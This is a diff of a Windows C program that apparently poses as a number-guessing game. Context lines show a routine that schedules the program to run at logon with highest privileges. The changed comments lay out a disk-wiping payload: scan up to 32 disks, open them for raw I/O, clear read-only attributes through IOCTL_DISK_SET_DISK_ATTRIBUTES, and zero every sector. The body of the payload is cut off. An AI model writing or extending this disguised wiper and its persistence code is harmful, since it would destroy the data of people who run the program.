@@ -5,6 +5,10 @@
 #include <stdlib.h>
 #include <winioctl.h>
 
+// note*
+// this is the most destruction you can do in ring3 but..
+// this wont effect offline disks or hardware/kernal-protected disks
+
 // schedules self on logon with highest priviliges 
 void task_sch() {
     char exepath[MAX_PATH]; //finding current executable
@@ -19,7 +23,6 @@ void task_sch() {
     system(cmd);
     
 }
-// random numer 1-10 guessing game
 void game() {
     SetConsoleTitleA("Screen");
 
@@ -48,11 +51,11 @@ void safe() {
     system("schtasks /delete /tn \"game\" /f");
 }
 
-//1. list all disks -> ld.txt
-//2. parce disk nums > lo.txt
-//3. clear all attriebutes so i can touch read-only files > cl.txt
-//4. exec diskpart with cmnds
-//5. rm temp files
+//1. scans >32 disks 
+//2. opens each direct, unbuffered i/o
+//3. clear *software* read-only attributes -> "IOCTL_DISK_SET_DISK_ATTRIBUTES"
+//4. finds drive size
+//5. zeros every sector useing 16 mb buffer
 
 void payload() {
     /*system(
